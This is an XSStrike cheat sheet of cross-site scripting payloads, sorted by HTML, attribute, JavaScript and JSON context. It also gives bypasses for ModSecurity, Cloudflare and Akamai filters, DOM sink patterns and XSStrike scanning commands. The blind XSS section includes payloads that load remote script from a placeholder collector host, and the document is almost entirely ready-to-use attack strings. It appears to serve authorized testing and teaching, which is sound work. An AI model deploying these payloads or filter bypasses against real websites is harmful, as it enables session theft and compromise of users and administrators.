# XSStrike — Context Payloads, WAF Bypass & Blind XSS

## Context-Specific Payloads

### HTML Tag Body Context

```html
<!-- Standard event handler injection -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>

<!-- Without parentheses (filter bypass) -->
<img src=x onerror=alert`1`>
<svg/onload=eval(atob('YWxlcnQoMSk='))>

<!-- JS URL context -->
<a href="javascript:alert(1)">click</a>
<a href="javascript:void(0)" onclick="alert(1)">click</a>
```

### HTML Attribute Context

```html
<!-- Break out of attribute -->
" onmouseover="alert(1)
' onmouseover='alert(1)
" autofocus onfocus="alert(1)

<!-- Inside href/src -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### JavaScript String Context

```javascript
// Break out of single-quoted string
'; alert(1); //
\'; alert(1); //

// Break out of double-quoted string
"; alert(1); //
\"; alert(1); //

// Template literal context
`; alert(1); //
${alert(1)}

// In script block without quotes
</script><script>alert(1)</script>
```

### JSON/API Context

```json
{"name":"<img src=x onerror=alert(1)>"}
{"callback":"alert(1)"}
{"redirect":"javascript:alert(1)"}
```

## WAF Evasion Techniques

### Keyword Bypass

```html
<!-- case variation -->
<sCrIpT>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- Self-closing tags -->
<script/src=data:,alert(1)>

<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<svg><script>alert&#40;1&#41;</script>

<!-- Unicode escape (JS context) -->
\u0061lert(1)
\u{61}lert(1)

<!-- Hex in JS -->
\x61lert(1)
```

### Filter Bypass Payloads

```html
<!-- No alert keyword -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=console.log(1)>

<!-- No parentheses -->
<img src=x onerror=alert`1`>
<img src=x onerror=window['alert'](1)>

<!-- No spaces -->
<img/src=x/onerror=alert(1)>
<script>alert(1)</script>

<!-- No angle brackets — JS context only -->
';alert(1)//
\';alert(1)//

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- Mixed encoding -->
<img src=x onerror=%61%6C%65%72%74(1)>
```

### Common WAF-Specific Bypasses

```html
<!-- ModSecurity / OWASP CRS -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<audio src=x onerror=alert(1)>
<video src=x onerror=alert(1)>

<!-- Cloudflare -->
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<svg><animate attributeName=href values=javascript:alert(1) /><a id=a><rect width=100 height=100 /></a></svg>

<!-- CSP bypass (no eval) -->
<script nonce="NONCE_HERE">alert(1)</script>
<link rel=import href=data:text/html,<script>parent.alert(1)</script>>

<!-- Akamai -->
<script>window['ale'+'rt'](1)</script>
<img src=x:x onerror=eval(atob('YWxlcnQoMSk='))>
```

## Blind XSS Payloads

Blind XSS fires when payload reaches admin panel, logging system, or backend rendering.

```bash
# Setup: use https://xsshunter.trufflesecurity.com or self-hosted bXSS
# Replace CALLBACK_URL with your collector

# Basic blind payloads to inject
"><script src=https://CALLBACK_URL/b.js></script>
'><script src=https://CALLBACK_URL/b.js></script>
"><img src=x onerror="var s=document.createElement('script');s.src='https://CALLBACK_URL/b.js';document.head.appendChild(s)">
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://CALLBACK_URL/b.js\';document.head.appendChild(a)')
```

### XSSHunter Integration

```bash
# XSS Hunter (trufflesecurity.com - free hosted)
# Register at xsshunter.trufflesecurity.com
# Get JS URL like: https://YOURNAME.xss.ht

# Inject in any field
"><script src=//YOURNAME.xss.ht></script>

# XSStrike blind mode
python3 xsstrike.py -u "http://target.com" --crawl --blind \
    --headers "Cookie: session=abc123"
# Payloads auto-injected in all discovered parameters
```

## DOM XSS Sinks

XSStrike automatically checks these JavaScript sinks:

```javascript
// Writing to DOM
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()

// URL-related
location.href =
location.assign()
location.replace()
window.open()

// Eval-type
eval()
setTimeout()
setInterval()
Function()
```

### Common DOM XSS Patterns

```javascript
// Hash-based (common)
document.write(location.hash)
element.innerHTML = window.location.search

// PostMessage
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
})

// jQuery
$(location.hash)  // → $(document).ready...
$('#el').html(userInput)

// Angular (template injection to XSS)
{{constructor.constructor('alert(1)')()}}
```

## XSStrike Specific Usage

```bash
# Force encoding for WAF evasion
python3 xsstrike.py -u "http://target.com?q=test" --encode

# Path parameter injection
python3 xsstrike.py -u "http://target.com/user/test" --path

# Custom payload file
python3 xsstrike.py -u "http://target.com?q=test" -f custom_payloads.txt

# Delay for rate limit / WAF
python3 xsstrike.py -u "http://target.com?q=test" -d 500

# Multi-threaded crawl
python3 xsstrike.py -u "http://target.com" --crawl -l 5 -t 20

# Seeds file (multiple entry points)
python3 xsstrike.py --seeds urls.txt --crawl
```
